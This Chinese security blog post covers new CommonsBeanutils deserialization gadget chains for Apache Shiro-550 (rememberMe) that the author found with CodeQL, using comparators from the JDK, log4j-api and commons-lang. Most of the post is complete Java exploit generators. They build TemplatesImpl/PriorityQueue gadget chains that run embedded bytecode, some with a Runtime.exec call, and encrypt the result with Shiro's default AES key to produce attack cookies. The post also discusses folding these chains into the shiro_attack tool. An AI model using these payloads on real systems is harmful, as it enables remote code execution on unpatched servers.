# CodeQL与Shiro550碰撞

##  JDK内置

上文说到，在JDK8u中查到了结果，一共又7个类可以替代`ComparableComparator`类。但可以直接调用实例化的类只用两个，`String#CASE_INSENSITIVE_ORDER`和`AttrCompare`，其他5个类权限皆是`private `。不能直接调用，只能通过反射调用，不过两个类也够用了，故本文只说这两个，其他的类有兴趣可以去看看。

----

### AttrCompare

**Compares two attributes based on the C14n specification.(根据C14n规范比较两个属性)。**这段话是官方对该类的描述。`AttrCompare`是在包`com.sun.org.apache.xml.internal.security.c14n.helper`下的一个类，是用`Attr`接口实现类比较方法。

```java
public int compare(Attr attr0, Attr attr1) {
        String namespaceURI0 = attr0.getNamespaceURI();
        String namespaceURI1 = attr1.getNamespaceURI();

        boolean isNamespaceAttr0 = XMLNS.equals(namespaceURI0);
        boolean isNamespaceAttr1 = XMLNS.equals(namespaceURI1);

        if (isNamespaceAttr0) {
            if (isNamespaceAttr1) {
                // both are namespaces
                String localname0 = attr0.getLocalName();
                String localname1 = attr1.getLocalName();

                if ("xmlns".equals(localname0)) {
                    localname0 = "";
                }

                if ("xmlns".equals(localname1)) {
                    localname1 = "";
                }

                return localname0.compareTo(localname1);
            }
            // attr0 is a namespace, attr1 is not
            return ATTR0_BEFORE_ATTR1;
        } else if (isNamespaceAttr1) {
            // attr1 is a namespace, attr0 is not
            return ATTR1_BEFORE_ATTR0;
        }

        // none is a namespace
        if (namespaceURI0 == null) {
            if (namespaceURI1 == null) {
                String name0 = attr0.getName();
                String name1 = attr1.getName();
                return name0.compareTo(name1);
            }
            return ATTR0_BEFORE_ATTR1;
        } else if (namespaceURI1 == null) {
            return ATTR1_BEFORE_ATTR0;
        }

        int a = namespaceURI0.compareTo(namespaceURI1);
        if (a != 0) {
            return a;
        }

        return (attr0.getLocalName()).compareTo(attr1.getLocalName());
    }
```

`compare`方法是一个有参方法，所以在调用方法时并不能直接传入两个String类型或者Object类型。

![11](https://img-blog.csdnimg.cn/f7e925b667bd4b979c760313a2e8b6e8.png)

然而Attr是一个接口，不能直接实例化，只能找实现类。这里我使用的是`com\sun\org\apache\xerces\internal\dom\AttrNSImpl.java`类。

![image-20220221183035494](https://cdn.jsdelivr.net/gh/SummerSec/Images/35u3035ec35u3035ec.png)

```
        AttrCompare attrCompare = new AttrCompare();
        AttrNSImpl attrNS = new AttrNSImpl();
        attrNS.setValues(new CoreDocumentImpl(),"1","1","1");
        attrCompare.compare(attrNS,attrNS);
```

最终利用代码：

```
package summersec.shirodemo.Payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;



public class CommonsBeanutilsAttrCompare {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        AttrNSImpl attrNS1 = new AttrNSImpl(new CoreDocumentImpl(),"1","1","1");

        final BeanComparator comparator = new BeanComparator(null, new AttrCompare());
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(attrNS1);
        queue.add(attrNS1);


        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());

        byte[] payloads = new CommonsBeanutilsAttrCompare().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }

}

```

最终实际结果

![](https://img-blog.csdnimg.cn/0a6fb4c59be54d3d95fc711a8354e6f1.gif)



----

### String#CASE_INSENSITIVE_ORDER

该类在p牛文章详细介绍了，这里直接贴代码吧。

```
package summersec.shirodemo.Payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @ClassName: CommonsBeanutils1Shiro
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/5/19 16:23
 * @Version: v1.0.0
 * @Description: 参考https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html
 **/


public class CommonsBeanutilsString {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
//        byte[] bytes = Evil.class.getName().getBytes();
//        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(bytes);
        byte[] payloads = new CommonsBeanutilsString().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }

}
```



----





## 第三方依赖

在挖掘完前面两个类的时候，我就在想其他第三方组件里面会不会存在呢？于是乎就有了下面的结果，测试了43个开源项目，其中15个有。这里只谈论了两个组件apache/log4j、apache/Commons-lang

![image-20220221183209062](https://cdn.jsdelivr.net/gh/SummerSec/Images/9u329ec9u329ec.png)



----

### PropertySource#Comparator



`PropertySource#Comparator`是在组件`log4j-api`下的一个类，log4j是Apache基金会下的一个Java日志组件，宽泛被应用在各大应用上，在`spring-boot`也能看到其身影。

![image-20220221183100323](https://cdn.jsdelivr.net/gh/SummerSec/Images/0u310ec0u310ec.png)



![image-20220221183140909](https://cdn.jsdelivr.net/gh/SummerSec/Images/41u3141ec41u3141ec.png)



`PropertySource#Comparator`的代码只有八行，其中比较方法也是有参方法，参数类型是`PropertySource`。

```
class Comparator implements java.util.Comparator<PropertySource>, Serializable {
    private static final long serialVersionUID = 1L;

    @Override
    public int compare(final PropertySource o1, final PropertySource o2) {
        return Integer.compare(Objects.requireNonNull(o1).getPriority(), Objects.requireNonNull(o2).getPriority());
    }
}
```

构造成gadget链的最终代码如下，在第38行开始是实现接口`PropertySource`的，不过也可以只写一个实现类就行。

ps：这里就不在演示效果。

```
package summersec.shirodemo.Payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.logging.log4j.util.PropertySource;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;




public class CommonsBeanutilsPropertySource<pubilc> {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        PropertySource propertySource1 = new PropertySource() {

            @Override
            public int getPriority() {
                return 0;
            }

        };
        PropertySource propertySource2 = new PropertySource() {

            @Override
            public int getPriority() {
                return 0;
            }

        };

        final BeanComparator comparator = new BeanComparator(null, new PropertySource.Comparator());
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later

        queue.add(propertySource1);
        queue.add(propertySource2);

        setFieldValue(comparator, "property", "outputProperties");
//        setFieldValue(comparator, "property", "output");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static class Evils extends AbstractTranslet {
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

        public Evils() throws Exception {
            System.out.println("Hello TemplatesImpl");
            Runtime.getRuntime().exec("calc.exe");
        }
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evils.class.getName());
        byte[] payloads = new CommonsBeanutilsPropertySource().getPayload(clazz.toBytecode());
        ByteArrayInputStream bais = new ByteArrayInputStream(payloads);
//        System.out.println(bais.read());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();


//        AesCipherService aes = new AesCipherService();
//        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
//
//        ByteSource ciphertext = aes.encrypt(payloads, key);
//        System.out.printf(ciphertext.toString());
    }

}
```



----

### ObjectToStringComparator

`ObjectToStringComparator`是apache属于下的`Commons-lang`组件，也是一个比较典型的组件。

![image-20220221183227584](https://cdn.jsdelivr.net/gh/SummerSec/Images/27u3227ec27u3227ec.png)

该类的Compare方法参数是Object类型，比较简单。

直接贴出代码：

```
package summersec.shirodemo.Payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;




public class CommonsBeanutilsObjectToStringComparator<pubilc> {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        ObjectToStringComparator stringComparator = new ObjectToStringComparator();


        final BeanComparator comparator = new BeanComparator(null, stringComparator);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(stringComparator);
        queue.add(stringComparator);



        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static class Evils extends AbstractTranslet {
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

        public Evils() throws Exception {
            System.out.println("Hello TemplatesImpl");
            Runtime.getRuntime().exec("calc.exe");
        }
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evils.class.getName());
        byte[] payloads = new CommonsBeanutilsObjectToStringComparator().getPayload(clazz.toBytecode());


        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }

}
```



----

## 集成化--自动化

挖掘之后在想如何集成到工具里面时，使用[shiro_attack](https://github.com/j1anFen/shiro_attack)发现，该工具里面是集成p牛的链。但本地测试的时候没有成功，看环境报错问题还是**serialVersionUID **的问题。可惜2.0版本的shiro_attack并不开源，拿着1.5版本的源码将其去掉了原依赖的CommonsBeanutils组件，并且将shiro的版本改成了1.2.4。

玩到后面，我想了一个问题。如果开发人员，没有以这种方式去掉依赖或者其他方式去掉该依赖，亦或者依赖了更高的版本CommonsBeanutils依赖，那么shiro550漏洞在有key的情况下，是**几乎**不可能拿不下的！

```
    <exclusions>
    <exclusion>
    <artifactId>org.apache.commons</artifactId>
    <groupId>commons-beanutils</groupId>
    </exclusion>
    </exclusions>
```

那么就是以下的情况，只需要在挖掘更多的gadget和解决高版本CommonsBeanutils的serialVersionUID不同问题。

![image-20220221183250833](https://cdn.jsdelivr.net/gh/SummerSec/Images/50u3250ec50u3250ec.png)

目前CommonsBeanutils最高版本是1.9.4（截至本文创作时间）

CommonsBeanutils的1.9.4的升级描述是，也就是说默认情况下还是存在反序列化漏洞的，实测也存在着。

> A special BeanIntrospector class was added in version 1.9.2. This can be used to stop attackers from using the class property of Java objects to get access to the classloader. However this protection was not enabled by default. PropertyUtilsBean (and consequently BeanUtilsBean) now disallows class level property access by default, thus protecting against CVE-2014-0114.

> 在1.9.2版本中加入了一个特殊的BeanIntrospector类。这可以用来阻止攻击者使用Java对象的class属性来获得对classloader的访问。然而，这种保护在默认情况下是不启用的。PropertyUtilsBean（以及随之而来的BeanUtilsBean）现在默认不允许类级属性访问，从而防止CVE-2014-0114。

![在这里插入图片描述](https://img-blog.csdnimg.cn/3752208c97184e86b07a244b55f1c660.png)



----

## 总结

理论上JDK内置的两个gadget是只要存在CommonsBeanutils组件（无论版本）是一定可以拿下的shiro550的，但作为一种思路我还是去研究了其他的组件。本文还是遗漏一个问题，遇到不同版本的CommonsBeanutils如何解决serialVersionUID 不同的问题？我能目前能想到方法是，首先判断CommonsBeanutils组件的版本，这个问题还是做不到。只能盲猜，用盲打的方式一个个版本尝试一次，但此方法还是比较耗时耗力。

1. CommonsBeansutils 在shiro-core1.2.4是1.8.3版本，高版本的shiro里面的版本不同。

3. - String.CASE_INSENSITIVE_ORDER --> JDK
    - AttrCompare --> JDK
    - ObjectToStringComparator  --> apache/commons-lang
    - PropertySource.Comparator()  --> apache/log4j
   
   ........
   
   

其实在看p牛的文章的时间花了很久很久，基本上有一段时间文章链接在浏览器一直是存在的。其中还有一段时间我又去研究回显了，在机缘巧合的一天，妹子没回我消息。我重新打开电脑，研究起来然后灵光一闪......

如有错误还请谅解，本文只是个人见解。



----



## 参考



https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html

